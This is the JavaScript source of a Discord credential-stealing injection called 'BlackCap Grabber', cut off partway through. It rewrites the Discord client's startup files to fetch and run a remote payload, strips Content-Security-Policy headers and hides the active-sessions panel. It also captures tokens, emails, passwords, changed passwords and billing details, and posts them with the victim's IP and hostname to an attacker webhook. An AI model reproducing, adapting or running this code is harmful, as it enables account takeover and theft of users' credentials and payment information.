const fs = require('fs');
const path = require('path');
const {
    BrowserWindow,
    session
} = require('electron')
const args = process.argv;
const querystring = require('querystring');
const os = require('os')
const https = require("https");
const computerName = os.hostname();


const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`

String.prototype.insert = function(index, string) {
    if (index > 0) {
        return this.substring(0, index) + string + this.substr(index);
    }

    return string + this;
};

const config = {
    "logout": "true",
    "logout-notify": "true",
    "init-notify": "true",
    "embed-color": 374276,

    injection_url: "https://raw.githubusercontent.com/Inplex-sys/BlackCap-Grabber-NoDualHook/main/inject.js",
    webhook: "%WEBHOOK%",
    filter2: {
        urls: [
      "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
      "https://*.discord.com/api/v*/applications/detectable",
      "https://discord.com/api/v*/applications/detectable",
      "https://*.discord.com/api/v*/users/@me/library",
      "https://discord.com/api/v*/users/@me/library",
      "wss://remote-auth-gateway.discord.gg/*",
    ],
    },
};



let bannerurl = ""
let usericonurl = ""

const discordPath = (function() {
    const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;
    if (process.platform === "win32") {
        resourcePath = path.join(app, "resources");
    } else if (process.platform === "darwin") {
        resourcePath = path.join(app, "Contents", "Resources");
    }
    if (fs.existsSync(resourcePath)) return {
        resourcePath,
        app
    };
    return "", "";
})();

function updateCheck() {
    const {
        resourcePath,
        app
    } = discordPath;
    if (resourcePath === undefined || app === undefined) return;
    const appPath = path.join(resourcePath, "app");
    const packageJson = path.join(appPath, "package.json");
    const resourceIndex = path.join(appPath, "index.js");
    //const indexJs = '%num_core_discord%'
    const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
    const bdPath = path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar");
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if(app === 'Lightcord')return;
    if(app === 'DiscordCanary')return;
    if(app === 'DiscordPTB')return;
    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

    if (process.platform === "win32" || process.platform === "darwin") {
        fs.writeFileSync(
            packageJson,
            JSON.stringify({
                    name: "discord",
                    main: "index.js",
                },
                null,
                4,
            ),
        );



        setTimeout(() => {
            
        const startUpScript = `const fs = require('fs'), https = require('https');
const indexJS = '${indexJs}';
const bdPath = '${bdPath}';



const fileSize = fs.statSync(indexJS).size
fs.readFileSync(indexJS, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJS);
        res.replace('%num_core_discord%', indexJS).replace('%WEBHOOK%', '${config.webhook}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, "app.asar")}')
if (fs.existsSync(bdPath)) require(bdPath);`;

        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, "\\\\"));
    }, 5000);
    }
    if (!fs.existsSync(path.join(__dirname, "blackcap"))) return !0;
    execScript(
        `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
    );
    return !1;
}

const execScript = (script) => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, !0);
};

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
};

async function noSessionPlease() {
    await sleep(1000)
    execScript(`
function userclick() {
    waitForElm(".children-1xdcWE").then((elm)=>elm[2].remove())
    waitForElm(".sectionTitle-3j2YI1").then((elm)=>elm[2].remove())
}

function IsSession(item) {
    return item?.innerText?.includes("Devices")
}

function handler(e) {
    e = e || window.event;
    var target = e.target || e.srcElement,
    text = target.textContent || target.innerText;   
    if (IsSession(target)) userclick()
}
function waitForElm(selector) {
    return new Promise(resolve => {
        const observer = new MutationObserver(mutations => {
            if (document.querySelectorAll(selector).length>2) {
                resolve(document.querySelectorAll(selector))
            observer.disconnect();
            }
        });
        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    });
}
document.addEventListener('click',handler,false);
`)
};


noSessionPlease()

const hooker = async (content) => {
    const data = JSON.stringify(content);
    const url = new URL(config.webhook);
    const options = {
        protocol: url.protocol,
        hostname: url.host,
        path: url.pathname,
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Access-Control-Allow-Origin": "*",
        },
    };
    const req = https.request(options);

    req.on("error", (err) => {
        console.log(err);
    });
    req.write(data);
    req.end();
};

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
        responseHeaders: {
            ...details.responseHeaders,
            'Access-Control-Allow-Headers': "*"
        }
    })
})

async function FirstTime() {
    const window = BrowserWindow.getAllWindows()[0];
    window.webContents.executeJavaScript(`${EvalToken}`, !0).then((async token => {

        if (config['init-notify'] == "true") {
            if (fs.existsSync(path.join(__dirname, "blackcap"))) {
                fs.rmdirSync(path.join(__dirname, "blackcap"));
                if (token == null || token == undefined || token == "") {
                    var {
                        ip
                    } = await getFromURL("https://www.myexternalip.com/json", null)
                    const c = {
                        username: "BlackCap Grabber",
                        avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                        content: "",
                        embeds: [{
                            title: "BlackCap Initalized",
                            color: config["embed-color"],
                            fields: [{
                                name: "Injection Info",
                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
                                inline: !1
							}],
                            author: {
                                name: "BlackCap"
                            },
                            footer: {
                                text: "By �KSCH, Dual Hook Removed By Inplex-sys"
                            }
						}]
                    };
                    hooker(c)

                } else {
                    var b = await getFromURL("https://discord.com/api/v8/users/@me", token)
                    var {
                        ip
                    } = await getFromURL("https://www.myexternalip.com/json", null)
                    
                    if(b.avatar === null){
                        usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
                    }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                    if(b.banner === null){
                        bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
                    }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                    const c = {
                        username: "BlackCap Grabber",
                        avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                        content: "",
                        embeds: [{
                            title: "BlackCap Initalized",
                            description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                            color: config["embed-color"],
                            fields: [{
                                name: "Injection Info",
                                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                                inline: !1
								}, {
                                name: "Username <:username:1041634536733290596> ",
                                value: `\`${b.username}#${b.discriminator}\``,
                                inline: !0
								}, {
                                name: "ID <:iduser:1041634535395307520>",
                                value: `\`${b.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
                                inline: !0
								}, {
                                name: "Badges <:badge:1041634538150973460>",
                                value: `${GetBadges(b.flags)}`,
                                inline: !0
								}, {
                                name: "Language <:language:1041640473477001236>",
                                value: `${GetLangue(b.locale)}`,
                                inline: !0
								}, {
                                name: "NSFW <a:nsfw:1041640474617839616>",
                                value: `${GetNSFW(b.nsfw_allowed)}`,
                                inline: !1
								}, {
                                name: "A2F <a:a2f:1040272766982692885>",
                                value: `${GetA2F(b.mfa_enabled)}`,
                                inline: !0
								}, {
                                name: "@Copyright",
                                value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                                inline: !0
								}, {
                                name: "<a:tokens:1041634540537511957> Token",
                                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                                inline: !1
								}],

                            footer: {
                                text: "By �KSCH, Dual Hook Removed By Inplex-sys"
                            },
                            image: {
                                url: bannerurl,
                            },
                            thumbnail: {
                                url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
                            }
							}]
                    };

                    hooker(c)
                };




                if (!fs.existsSync(path.join(__dirname, "blackcap"))) {
                    return !0
                }

                fs.rmdirSync(path.join(__dirname, "blackcap"));
                if (config.logout != "false" || config.logout !== "%LOGOUT%") {
                    if (config['logout-notify'] == "true") {
                        if (token == null || token == undefined || token == "") {
                            var {
                                ip
                            } = await getFromURL("https://www.myexternalip.com/json", null)
                            const c = {
                                username: "BlackCap Grabber",
                                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                                content: "",
                                embeds: [{
                                    title: "BlackCaped User log out (User not Logged in before)",
                                    color: config["embed-color"],
                                    fields: [{
                                        name: "Injection Info",
                                        value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
                                        inline: !1
							}],
                                    author: {
                                        name: "BlackCap"
                                    },
                                    footer: {
                                        text: "By �KSCH, Dual Hook Removed By Inplex-sys"
                                    }
						}]
                            };
                            
    
    
                            hooker(c)

                        } else {
                            var b = await getFromURL("https://discord.com/api/v8/users/@me", token)
                            var {
                                ip
                            } = await getFromURL("https://www.myexternalip.com/json", null)
                            if(b.avatar === null){
                                usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
                            }else usericonurl = `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}.png?size=600`;
                            if(b.banner === null){
                                bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
                            }else bannerurl = `https://cdn.discordapp.com/banners/${b.id}/${b.banner}.png?size=160`;
                            const c = {
                                username: "BlackCap Grabber",
                                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                                content: "",
                                embeds: [{
                                    title: "BlackCap Victim got logged out",
                                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                                    color: config["embed-color"],
                                    fields: [{
                                        name: "Injection Info",
                                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                                        inline: !1
								}, {
                                        name: "Username <:username:1041634536733290596> ",
                                        value: `\`${b.username}#${b.discriminator}\``,
                                        inline: !0
								}, {
                                        name: "ID <:iduser:1041634535395307520>",
                                        value: `\`${b.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${b.id})`,
                                        inline: !0
								}, {
                                        name: "Badges <:badge:1041634538150973460>",
                                        value: `${GetBadges(b.flags)}`,
                                        inline: !0
								}, {
                                        name: "NSFW <a:nsfw:1041640474617839616>",
                                        value: `${GetNSFW(b.nsfw_allowed)}`,
                                        inline: !1
								}, {
                                        name: "A2F <a:a2f:1040272766982692885>",
                                        value: `${GetA2F(b.mfa_enabled)}`,
                                        inline: !0
								}, {
                                        name: "@Copyright",
                                        value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                                        inline: !0
								}, {
                                        name: "<a:tokens:1041634540537511957> Token",
                                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                                        inline: !1
								}],

                                    footer: {
                                        text: "By �KSCH, Dual Hook Removed By Inplex-sys"
                                    },
                                    image: {
                                        url: bannerurl,
                                    },
                                    thumbnail: {
                                        url: `https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`
                                    }
							}]
                            };
    
    
                            hooker(c)
                            
                        }
                    }


                    const window = BrowserWindow.getAllWindows()[0];
                    window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
                }
                return !1
            }
        }
    }))
}


const Filter = {
    "urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
}





async function getFromURL(url, token) {
    const window = BrowserWindow.getAllWindows()[0];
    var b = await window.webContents.executeJavaScript(`
    var xmlHttp = new XMLHttpRequest();
    xmlHttp.open( "GET", "${url}", false );
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send( null );
    JSON.parse(xmlHttp.responseText);`, !0)
    return b
}




function GetNSFW(reader) {
    if (reader == true) {
        return ":underage: `NSFW Allowed`"
    }
    if (reader == false) {
        return ":underage: `NSFW Not Allowed`"
    } else {
        return "Idk bro you got me"
    }
}

function GetA2F(reader) {
    if (reader == true) {
        return ":lock: `A2F Enabled`"
    }
    if (reader == false) {
        return ":unlock: `A2F Not Enabled`"
    } else {
        return "Idk bro you got me"
    }
}



function GetNitro(flags) {
    if (flags == 0) {
        return "No Nitro"
    }
    if (flags == 1) {
        return "<:classic:896119171019067423> \`Nitro Classic\`"
    }
    if (flags == 2) {
        return "<a:boost:824036778570416129> \`Nitro Boost\`"
    } else {
        return "No Nitro"
    }
}


function GetRBadges(flags) {
    const Discord_Employee = 1;
    const Partnered_Server_Owner = 2;
    const HypeSquad_Events = 4;
    const Bug_Hunter_Level_1 = 8;
    const Early_Supporter = 512;
    const Bug_Hunter_Level_2 = 16384;
    const Early_Verified_Bot_Developer = 131072;
    var badges = "";
    if ((flags & Discord_Employee) == Discord_Employee) {
        badges += "<:staff:874750808728666152> "
    }
    if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
        badges += "<:partner:874750808678354964> "
    }
    if ((flags & HypeSquad_Events) == HypeSquad_Events) {
        badges += "<:hypesquad_events:874750808594477056> "
    }
    if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
        badges += "<:bughunter_1:874750808426692658> "
    }
    if ((flags & Early_Supporter) == Early_Supporter) {
        badges += "<:early_supporter:874750808414113823> "
    }
    if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
        badges += "<:bughunter_2:874750808430874664> "
    }
    if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
        badges += "<:developer:874750808472825986> "
    }
    if (badges == "") {
        badges = ""
    }
    return badges
}

function GetLangue(read) {
    const France = 'fr';
    const Dansk = 'da';
    const Deutsch = 'de';
    const englishUK = 'en-GB';
    const englishUS = 'en-US';
    const espagnol = 'es-ES';
    const hrvatski = 'hr';
    const italianio = 'it';
    const lietuviskai = 'lt';
    const magyar = 'hu';
    const neerland = 'nl';
    const Norsk = 'no';
    const polski = 'pl';
    const portugues = 'pr-BR';
    const Romana = 'ro';
    const finlandais = 'fi';
    const svenska = 'sv-SE';
    const tiengviet = 'vi';
    const turk = 'tr';
    const cestina = 'cs';
    const grecque = 'el';
    const bulgar = 'bg';
    const russe = 'ru';
    const ukrainier = 'uk';
    const inde = 'hi';
    const thai = 'th';
    const chineschina = 'zh-CN';
    const japonais = 'ja';
    const chinestaiwan = 'zh-TW';
    const korea = 'ko';
    var langue = "";
    if (read == France) {
        langue += ":flag_fr: French"
    }
    if (read == Dansk) {
        langue += ":flag_dk: Dansk"
    }
    if (read == Deutsch) {
        langue += ":flag_de: Deutsch"
    }
    if (read == englishUK) {
        langue += ":england: English"
    }
    if (read == englishUS) {
        langue += ":flag_us: USA"
    }
    if (read == espagnol) {
        langue += ":flag_es: Espagnol"
    }
    if (read == hrvatski) {
        langue += ":flag_hr: Croatian"
    }
    if (read == italianio) {
        langue += ":flag_it: Italianio"
    }
    if (read == lietuviskai) {
        langue += ":flag_lt: Lithuanian"
    }
    if (read == magyar) {
        langue += ":flag_hu: Hungarian"
    }
    if (read == neerland) {
        langue += ":flag_nl: Dutch"
    }
    if (read == Norsk) {
        langue += ":flag_no: Norwegian"
    }
    if (read == polski) {
        langue += ":flag_pl: Polish"
    }
    if (read == portugues) {
        langue += ":flag_pt: Portuguese"
    }
    if (read == Romana) {
        langue += ":flag_ro: Romanian"
    }
    if (read == finlandais) {
        langue += ":flag_fi: Finnish"
    }
    if (read == svenska) {
        langue += ":flag_se: Swedish"
    }
    if (read == turk) {
        langue += ":flag_tr: Turkish"
    }
    if (read == tiengviet) {
        langue += ":flag_vn: Vietnamese"
    }
    if (read == cestina) {
        langue += ":flag_cz: Czech"
    }
    if (read == grecque) {
        langue += ":flag_gr: Greek"
    }
    if (read == bulgar) {
        langue += ":flag_bg: Bulgarian"
    }
    if (read == russe) {
        langue += ":flag_ru: Russian"
    }
    if (read == ukrainier) {
        langue += ":flag_ua: Ukrainian"
    }
    if (read == inde) {
        langue += ":flag_in: Indian"
    }
    if (read == thai) {
        langue += ":flag_tw: Taiwanese"
    }
    if (read == chineschina) {
        langue += ":flag_cn: Chinese-China"
    }
    if (read == japonais) {
        langue += ":flag_jp: Japanese"
    }
    if (read == chinestaiwan) {
        langue += ":flag_cn: Chinese-Taiwanese"
    }
    if (read == korea) {
        langue += ":flag_kr: Korean"
    }
    if (langue == "") {
        langue = ":x: None"
    }
    return langue
}

function GetBadges(flags) {
    const Discord_Employee = 1;
    const Partnered_Server_Owner = 2;
    const HypeSquad_Events = 4;
    const Bug_Hunter_Level_1 = 8;
    const House_Bravery = 64;
    const House_Brilliance = 128;
    const House_Balance = 256;
    const Early_Supporter = 512;
    const Bug_Hunter_Level_2 = 16384;
    const Early_Verified_Bot_Developer = 131072;
    const Discord_Active_Developer = 4194304;
    var badges = "";
    if ((flags & Discord_Employee) == Discord_Employee) {
        badges += "<:staff:874750808728666152> "
    }
    if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) {
        badges += "<:partner:874750808678354964> "
    }
    if ((flags & HypeSquad_Events) == HypeSquad_Events) {
        badges += "<:hypesquad_events:874750808594477056> "
    }
    if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) {
        badges += "<:bughunter_1:874750808426692658> "
    }
    if ((flags & House_Bravery) == House_Bravery) {
        badges += "<:bravery:874750808388952075> "
    }
    if ((flags & House_Brilliance) == House_Brilliance) {
        badges += "<:brilliance:874750808338608199> "
    }
    if ((flags & House_Balance) == House_Balance) {
        badges += "<:balance:874750808267292683> "
    }
    if ((flags & Early_Supporter) == Early_Supporter) {
        badges += "<:early_supporter:874750808414113823> "
    }
    if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) {
        badges += "<:bughunter_2:874750808430874664> "
    }
    if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) {
        badges += "<:developer:874750808472825986> "
    }
    if ((flags & Discord_Active_Developer) == Discord_Active_Developer) {
        badges += "<:activedev:1041634224253444146> "
    }
    if (badges == "") {
        badges = "None"
    }
    return badges
}



async function Login(email, password, token) {
    const window = BrowserWindow.getAllWindows()[0];
    var info = await getFromURL("https://discord.com/api/v8/users/@me", token)
    var {
        ip
    } = await getFromURL("https://www.myexternalip.com/json", null)
    window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
        window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {
            function totalFriends() {
                var f = JSON.parse(info4)
                const r = f.filter((user) => {
                    return user.type == 1
                })
                return r.length
            }

            function CalcFriends() {
                var f = JSON.parse(info4)
                const r = f.filter((user) => {
                    return user.type == 1
                })
                var gay = "";
                for (z of r) {
                    var b = GetRBadges(z.user.public_flags)
                    if (b != "") {
                        gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
                    }
                }
                if (gay == "") {
                    gay = "No Rare Friends"
                }
                return gay
            }

            function Cool() {
                const json = JSON.parse(info3)
                var billing = "";
                json.forEach(z => {
                    if (z.type == "") {
                        return ":x:"
                    } else if (z.type == 2 && z.invalid != !0) {
                        billing += ":heavy_check_mark:" + " <:paypal:896441236062347374>"
                    } else if (z.type == 1 && z.invalid != !0) {
                        billing += ":heavy_check_mark:" + " :credit_card:"
                    } else {
                        return ":x:"
                    }
                })
                if (billing == "") {
                    billing = ":x:"
                }
                return billing
            }
            if(info.avatar === null){
                usericonurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png"
            }else usericonurl = `https://cdn.discordapp.com/avatars/${info.id}/${info.avatar}.png?size=600`;
            if(info.banner === null){
                bannerurl = "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/Banner.png"
            }else bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=160`;
            
            const params = {
                username: "BlackCap Grabber",
                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                content: "",
                embeds: [{
                    "title": "BlackCap User Login",
                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                    "color": config['embed-color'],
                    "fields": [{
                        name: "Injection Info",
                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                        inline: !1
												}, {
                        name: "Username <:username:1041634536733290596> ",
                        value: `\`${info.username}#${info.discriminator}\``,
                        inline: !0
												}, {
                        name: "ID <:iduser:1041634535395307520>",
                        value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${info.id})`,
                        inline: !0
												}, {
                        name: "Nitro <a:nitro:1041639670288748634>",
                        value: `${GetNitro(info.premium_type)}`,
                        inline: !0
												}, {
                        name: "Badges <:badge:1041634538150973460>",
                        value: `${GetBadges(info.flags)}`,
                        inline: !0
												}, {
                        name: "Language <:language:1041640473477001236>",
                        value: `${GetLangue(info.locale)}`,
                        inline: !0
												}, {
                        name: "NSFW <a:nsfw:1041640474617839616>",
                        value: `${GetNSFW(info.nsfw_allowed)}`,
                        inline: !1
												}, {
                        name: "A2F <a:a2f:1040272766982692885>",
                        value: `${GetA2F(info.mfa_enabled)}`,
                        inline: !0
												}, {
                        name: "@Copyright",
                        value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                        inline: !0
												}, {
                        name: "Billing <a:billing:1041641103629234196>",
                        value: `${Cool()}`,
                        inline: !1
												}, {
                        name: "Email <a:email:1041639672037785691>",
                        value: `\`${email}\``,
                        inline: !0
												}, {
                        name: "<a:password:1041639669047238676> Password",
                        value: `\`${password}\``,
                        inline: !0
												}, {
                        name: "<a:tokens:1041634540537511957> Token",
                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
                        inline: !1
												}, ],

                    "footer": {
                        "text": "By �KSCH, Dual Hook Removed By Inplex-sys"
                    },
                    "thumbnail": {
                        "url": `${usericonurl}`
                    }
											}, {
                    "title": `<a:totalfriends:1041641100017946685> Total Friends (${totalFriends()})`,
                    "color": config['embed-color'],
                    "description": CalcFriends(),

                    "footer": {
                        "text": "By �KSCH, Dual Hook Removed By Inplex-sys"
                    },
                    "image": {
                        'url': `${bannerurl}`,
                    },
                    "thumbnail": {
                        "url": `${usericonurl}`
                    }
											}]
            }
            
            hooker(params)
        })
    })
}




async function ChangePassword(oldpassword, newpassword, token) {
    const window = BrowserWindow.getAllWindows()[0];
    var info = await getFromURL("https://discord.com/api/v8/users/@me", token)
    var {
        ip
    } = await getFromURL("https://www.myexternalip.com/json", null)
    window.webContents.executeJavaScript(`
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );
        xmlHttp.setRequestHeader("Authorization", "${token}");
        xmlHttp.send( null );
        xmlHttp.responseText`, !0).then((info3) => {
        window.webContents.executeJavaScript(`
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );
            xmlHttp.setRequestHeader("Authorization", "${token}");
            xmlHttp.send( null );
            xmlHttp.responseText`, !0).then((info4) => {

            function totalFriends() {
                var f = JSON.parse(info4)
                const r = f.filter((user) => {
                    return user.type == 1
                })
                return r.length
            }

            function CalcFriends() {
                var f = JSON.parse(info4)
                const r = f.filter((user) => {
                    return user.type == 1
                })
                var gay = "";
                for (z of r) {
                    var b = GetRBadges(z.user.public_flags)
                    if (b != "") {
                        gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
                    }
                }
                if (gay == "") {
                    gay = "No Rare Friends"
                }
                return gay
            }

            function Cool() {
                const json = JSON.parse(info3)
                var billing = "";
                json.forEach(z => {
                    if (z.type == "") {
                        return ":x:"
                    } else if (z.type == 2 && z.invalid != !0) {
                        billing += ":heavy_check_mark:" + " <:paypal:896441236062347374>"
                    } else if (z.type == 1 && z.invalid != !0) {
                        billing += ":heavy_check_mark:" + " :credit_card:"
                    } else {
                        return ":x:"
                    }
                })
                if (billing == "") {
                    billing = ":x:"
                }
                return billing
            }
            let bannerurl = `https://cdn.discordapp.com/banners/${info.id}/${info.banner}.png?size=600` || "https://media.discordapp.net/attachments/1032256615962906655/1037042057845407844/Banner.png?size=600";
            const params = {
                username: "BlackCap Grabber",
                avatar_url: "https://raw.githubusercontent.com/KSCHdsc/BlackCap-Assets/main/blackcap%20(2).png",
                content: "",
                embeds: [{
                    "title": "BlackCap Detect Password Changed",
                    description: "[<a:blackcapgif:1041634542093619260>  **Oh you have BlackCaped someone**](https://github.com/KSCHdsc)",
                    "color": config['embed-color'],
                    "fields": [{
                        name: "Injection Info",
                        value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${usericonurl})`,
                        inline: !1
												}, {
                        name: "Username <:username:1041634536733290596> ",
                        value: `\`${info.username}#${info.discriminator}\``,
                        inline: !0
												}, {
                        name: "ID <:iduser:1041634535395307520>",
                        value: `\`${info.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${info.id})`,
                        inline: !0
												}, {
                        name: "Nitro <a:nitro:1041639670288748634>",
                        value: `${GetNitro(info.premium_type)}`,
                        inline: !0
												}, {
                        name: "Badges <:badge:1041634538150973460>",
                        value: `${GetBadges(info.flags)}`,
                        inline: !0
												}, {
                        name: "Language <:language:1041640473477001236>",
                        value: `${GetLangue(info.locale)}`,
                        inline: !0
												}, {
                        name: "NSFW <a:nsfw:1041640474617839616>",
                        value: `${GetNSFW(info.nsfw_allowed)}`,
                        inline: !1
												}, {
                        name: "A2F <a:a2f:1040272766982692885>",
                        value: `${GetA2F(info.mfa_enabled)}`,
                        inline: !0
												}, {
                        name: "@Copyright",
                        value: `[BlackCap 2021 <a:blackcapgif:1041634542093619260>](https://github.com/KSCHdsc/BlackCap-Grabber)`,
                        inline: !0
												}, {
                        name: "Billing <a:billing:1041641103629234196>",
                        value: `${Cool()}`,
                        inline: !1
												}, {
                        name: "Email <a:email:1041639672037785691>",
                        value: `\`${info.email}\``,
                        inline: !1
												}, {
                        name: "<a:password:1041639669047238676> Old Password",
                        value: `\`${oldpassword}\``,
                        inline: !0
												}, {
                        name: "<a:password:1041639669047238676> New Password",
                        value: `\`${newpassword}\``,
                        inline: !0
												}, {
                        name: "<a:tokens:1041634540537511957> Token",
                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${bannerurl})`,
